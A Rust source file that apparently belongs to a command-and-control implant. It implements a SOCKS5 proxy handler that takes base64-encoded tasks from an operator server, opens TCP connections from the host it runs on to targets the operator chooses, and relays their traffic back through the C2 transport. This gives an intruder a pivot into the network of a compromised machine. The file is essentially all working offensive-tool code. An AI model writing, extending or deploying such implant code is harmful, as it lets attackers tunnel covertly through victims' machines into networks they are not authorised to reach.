use std::collections::HashMap;
use std::net::TcpStream;
use std::sync::Mutex;
use std::io::{Read, Write};
use base64::decode;
use lazy_static::lazy_static;
use serde_json::Value;
use std::net::UdpSocket;
const CMD_UDP_ASSOCIATE: u8 = 0x03;

lazy_static! {
    // alongside your existing TCP map
    static ref UDP_CONNS: Mutex<HashMap<u64, UdpSocket>> = Mutex::new(HashMap::new());
}

lazy_static! {
    static ref CONNECTIONS: Mutex<HashMap<u64, TcpStream>> = Mutex::new(HashMap::new());
}

pub fn handle_socks(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    // extract parameters JSON
    let server_id = task.get("server_id")
        .ok_or("missing server_id")?
        .as_u64()
        .ok_or("server_id is not a string")?;
    let exit = task.get("exit")
        .ok_or("missing exit")?
        .as_bool()
        .ok_or("exit is not a boolean")?;

    if exit {
        CONNECTIONS.lock()?.remove(&server_id);
        let response = serde_json::json!({
            "action": "post_response",
            "socks": [
                {
                    "exit": exit,
                    "server_id": server_id,
                    "data": ""
                }
            ]
        });
        crate::transport::send_request(&response.to_string())?;
        return Ok(());
    }

    let b64 = task.get("data")
        .ok_or("missing parameters")?
        .as_str()
        .ok_or("parameters is not a string")?;
    let payload = decode(b64)?;

    let mut conns = CONNECTIONS.lock()?;
    if !conns.contains_key(&server_id) {
        let atyp = payload[3];
        let (addr, port) = match atyp {
            0x01 => { // IPv4
                let ip = &payload[4..8];
                let port = u16::from_be_bytes([payload[8], payload[9]]);
                (format!("{}.{}.{}.{}", ip[0], ip[1], ip[2], ip[3]), port)
            }
            0x03 => { // Domain name
                let len = payload[4] as usize;
                let domain = String::from_utf8_lossy(&payload[5..5 + len]);
                let port = u16::from_be_bytes([payload[5 + len], payload[6 + len]]);
                (domain.to_string(), port)
            }
            0x04 => { // IPv6
                let ip = &payload[4..20];
                let segments: Vec<String> = ip
                    .chunks(2)
                    .map(|chunk| format!("{:02x}{:02x}", chunk[0], chunk[1]))
                    .collect();
                let ip_str = format!("[{}]", segments.join(":"));
                let port = u16::from_be_bytes([payload[20], payload[21]]);
                (ip_str, port)
            }
            _ => return Err("Unsupported address type".into()),
        };

        let target_addr = format!("{}:{}", addr, port);
        println!("[DEBUG] target_addr: {}", target_addr);

        let stream = TcpStream::connect(target_addr)?;
        conns.insert(server_id, stream.try_clone()?);
        let stream = conns.get_mut(&server_id).unwrap();

        // Build full SOCKS5 CONNECT reply
        let mut response = vec![
            0x05,       // VER
            0x00,       // REP: succeeded
            0x00        // RSV
        ];

        if let Ok(std::net::SocketAddr::V4(v4)) = stream.local_addr() {
            response.push(0x01); // ATYP: IPv4
            response.extend(&v4.ip().octets());         // BND.ADDR
            response.extend(&v4.port().to_be_bytes());  // BND.PORT
        } else {
            // fallback dummy if not V4
            response.extend(&[0x01, 0, 0, 0, 0, 0, 0]);
        }

        let b64_response = base64::encode(&response);
        let response = serde_json::json!({
            "action": "post_response",
            "socks": [
                {
                    "exit": exit,
                    "server_id": server_id,
                    "data": b64_response
                }
            ]
        });
        crate::transport::send_request(&response.to_string())?;
        return Ok(());
    }

    if let Some(stream) = conns.get_mut(&server_id) {
        // Write incoming SOCKS payload to TCP stream
        stream.write_all(&payload)?;

        // Read response
        let mut buf = [0u8; 4096];
        let n = stream.read(&mut buf)?;

        let b64_response = base64::encode(&buf[..n]);
        let response = serde_json::json!({
            "action": "post_response",
            "socks": [
                {
                    "exit": false,
                    "server_id": server_id,
                    "data": b64_response
                }
            ]
        });
        crate::transport::send_request(&response.to_string())?;
    }
    return Ok(());
}